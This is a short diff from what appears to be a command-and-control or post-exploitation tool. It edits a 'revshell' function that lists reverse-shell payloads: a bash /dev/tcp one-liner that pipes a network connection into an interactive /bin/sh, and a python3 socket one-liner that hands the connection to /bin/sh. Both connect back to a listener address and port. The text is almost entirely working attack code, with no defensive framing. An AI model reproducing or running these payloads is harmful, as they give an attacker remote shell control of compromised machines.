@@ -110,7 +110,7 @@ def revshell(manager, agent_id, c2_server):
 
     # Fast TCP attempt
     payloads = [
-        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | bash >&3 2>&3'", "bash → LAN"),
+        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | TERM=dumb /bin/sh -i >&3 2>&3'", "bash → LAN"),
         (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(8);s.connect(('{LOCAL_IP}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh'],os.environ)\"", "python3 → LAN"),
     ]
 
